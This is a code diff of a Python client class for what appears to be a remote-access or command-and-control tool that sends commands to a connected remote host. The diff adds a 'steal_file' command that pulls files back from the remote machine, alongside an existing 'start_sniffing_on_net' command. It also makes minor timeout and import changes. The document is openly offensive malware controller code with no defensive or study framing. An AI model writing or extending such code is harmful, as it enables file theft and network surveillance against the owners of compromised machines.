@@ -1,7 +1,5 @@
 from typing import List
-from queue import Queue
 from threading import Thread
-from consts import *
 from . import *
 
 
@@ -15,9 +13,11 @@ class Client:
         self.connected = False
 
     def connect_to_server(self):
+        t = self.socket.gettimeout()
         self.socket.settimeout(TIMEOUT_SOCKET)
         self.socket.connect((self.ip, PORT))
         self.connected = True
+        self.socket.settimeout(t)
 
     def __eq__(self, other) -> bool:
         if isinstance(other, Client):
@@ -31,16 +31,28 @@ class Client:
     def send_command(self, command: str, params: List[str]):
         if not self.connected:
             return "This ovil is not connected"
-        if command == "start_sniffing_on_net":
-            send(command, self.socket)
-            self.start_sniffing_on_net()
-            response = receive_msg(self.socket)
-            return response
+        match command:
+            case "start_sniffing_on_net":
+                send(command, self.socket)
+                self.start_sniffing_on_net()
+                response = receive_msg(self.socket)
+                return response
+            case "steal_file":
+                msg = [command]
+                msg.extend(params)
+                send(str(Massages.SEP.value).join(msg), self.socket)
+                code, filename = receive_file(self.socket)
+                if not code:
+                    return Massages.NOT_OK, filename
+                result = receive_msg(self.socket)
+                return result, filename
+
 
         msg = [command]
         msg.extend(params)
         send(str(Massages.SEP.value).join(msg), self.socket)
         response = receive_msg(self.socket)
+        # response = response.replace("\n", "<br>")
         return response
 
     def start_sniffing_on_net(self):
